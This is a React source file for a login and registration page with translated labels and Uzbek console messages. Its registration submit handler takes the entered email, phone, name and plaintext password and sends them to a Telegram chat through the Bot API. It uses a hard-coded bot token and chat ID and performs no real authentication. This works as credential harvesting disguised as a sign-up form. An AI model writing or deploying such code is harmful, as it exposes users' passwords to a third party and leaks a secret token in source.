import React, { useState, useEffect, useRef } from 'react';
import "../login/login.scss";
import { useTranslation } from 'react-i18next';

const Login = () => {
    const { t, i18n } = useTranslation();
    
    const [formData, setFormData] = useState({
        email: '',
        textarea: '',
        name: '',
        phone: '',
        password: '',
    });

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData({
            ...formData,
            [name]: value,
        });
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        const token = "8194990714:AAGAdxhWYqZYjS7PbyQcngpMxG5wfDVFCaw";
        const chat_id = "-1002436631127";
        const my_text = `Email: ${formData.email}\nnumb: ${formData.phone}\nism:${formData.name}\nparol:${formData.password}`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(my_text)}`;

        fetch(url)
            .then((response) => {
                if (response.ok) {
                    console.log("Xabar muvaffaqiyatli yuborildi!");
                } else {
                    console.error("Xatolik yuz berdi:", response.statusText);
                }
            })
            .catch((error) => console.error("Fetch xatosi:", error));

        setFormData({
            email: '',
            textarea: '',
            name: '',
            phone: '',
            password: '',
        }); 
    };

    const [isRegister, setIsRegister] = useState(false);
    const [inputActive, setInputActive] = useState({
        name: false,
        phone: false,
        email: false,
        password: false,
    });

    const inputRef = useRef(null);

    const handleOnClick = (inputName) => {
        setInputActive(prevState => ({
            ...prevState,
            [inputName]: true,
        }));
    };

    const toggleForm = () => {
        setIsRegister(!isRegister);
    };

    useEffect(() => {
        const handleClickOutside = (event) => {
            if (inputRef.current && !inputRef.current.contains(event.target)) {
                setInputActive({
                    name: false,
                    phone: false,
                    email: false,
                    password: false,
                });
            }
        };

        document.addEventListener("mousedown", handleClickOutside);
        return () => {
            document.removeEventListener("mousedown", handleClickOutside);
        };
    }, []);

    return (
        <div className="login">
            <div className="container">
                <div className="login__box">
                    <div className="login__box-first">
                        {isRegister ? (
                            <>
                                <h1 className="login__box-title">{t("25")}</h1>
                                <div className="login__box-icon">
                                    <a href="#"><img className="login__icon" src="4.svg" alt="" /></a>
                                    <a href="#"><img className="login__icon" src="5.svg" alt="" /></a>
                                    <a href="#"><img className="login__icon" src="6.svg" alt="" /></a>
                                </div>
                                <p className="login__text">{t('24')}</p>
                                <form onSubmit={handleSubmit}>
                                    <div className="group" ref={inputRef}>
                                        <input
                                            className={`input__box ${inputActive.name ? "active" : ''}`}
                                            onClick={() => handleOnClick("name")}
                                            type="text"
                                            name="name"
                                            value={formData.name}
                                            onChange={handleChange}
                                            required
                                        />
                                        <label>{t('20')}</label>
                                    </div>
                                    <div className="group" ref={inputRef}>
                                        <input
                                            className={`input__box ${inputActive.phone ? "active" : ''}`}
                                            onClick={() => handleOnClick("phone")}
                                            type="tel"
                                            name="phone"
                                            value={formData.phone}
                                            onChange={handleChange}
                                            required
                                            onInput={(e) => e.target.value = e.target.value.replace(/\D/g, '')}
                                            placeholder={inputActive.phone ? "998 99 123 45 67" : ""}
                                        />
                                        <label>{t('21')}</label>
                                    </div>
                                    <div className="group" ref={inputRef}>
                                        <input
                                            className={`input__box ${inputActive.email ? "active" : ''}`}
                                            onClick={() => handleOnClick("email")}
                                            type="email"
                                            name="email"
                                            value={formData.email}
                                            onChange={handleChange}
                                            required
                                        />
                                        <label>Gmail</label>
                                    </div>
                                    <div className="group" ref={inputRef}>
                                        <input
                                            className={`input__box ${inputActive.password ? "active" : ''}`}
                                            onClick={() => handleOnClick("password")}
                                            type="password"
                                            name="password"
                                            value={formData.password}
                                            onChange={handleChange}
                                            required
                                        />
                                        <label>{t('22')}</label>
                                    </div>
                                    <div className='login__sign-box'>
                                        <button className="login__sign" type="submit">{t('19')}</button>
                                    </div>
                                </form>
                                <p className="login__toggle-text login__text-top">{t('23')} <span onClick={toggleForm}>{t('11')}</span></p>
                            </>
                        ) : (
                            <>
                                <h1 className="login__box-title">{t('12')}</h1>
                                <div className="login__box-icon">
                                    <a href="#"><img className="login__icon" src="4.svg" alt="" /></a>
                                    <a href="#"><img className="login__icon" src="5.svg" alt="" /></a>
                                    <a href="#"><img className="login__icon" src="6.svg" alt="" /></a>
                                </div>
                                <p className="login__text">{t('13')}</p>
                                <form>
                                    <div className="group" ref={inputRef}>
                                        <input
                                            className={`input__box ${inputActive.email ? "active" : ''}`}
                                            onClick={() => handleOnClick("email")}
                                            type="email"
                                            name="email"
                                            value={formData.email}
                                            onChange={handleChange}
                                            required
                                        />
                                        <label>Gmail</label>
                                    </div>
                                    <div className="group">
                                        <input
                                            className={`input__box ${inputActive.password ? "active" : ''}`}
                                            onClick={() => handleOnClick("password")}
                                            type="password"
                                            name="password"
                                            value={formData.password}
                                            onChange={handleChange}
                                            required
                                        />
                                        <label>{t('22')}</label>
                                    </div>
                                </form>
                                <a href="#" className="login__forgot">{t('14')}</a>
                                <div className='login__sign-box'>
                                    <a href='' className="login__sign">{t('11')}</a>
                                </div>
                                <p className="login__toggle-text">{t('15')} <span onClick={toggleForm}>{t('16')}</span></p>
                            </>
                        )}
                    </div>
                    <div className="login__box-sec">
                        <a href="" className="nav__logo-link"><img src="7.svg" alt="" /></a>
                        <h2 className="login__sec-title">{t('17')}</h2>
                        <p className="login__sec-text">{isRegister ? t('26') : t('18')}</p>
                        <div className='login__sign-box'>
                            <button className="login__sec-link" onClick={toggleForm}>{isRegister ? t('11') : t('16')}</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Login;
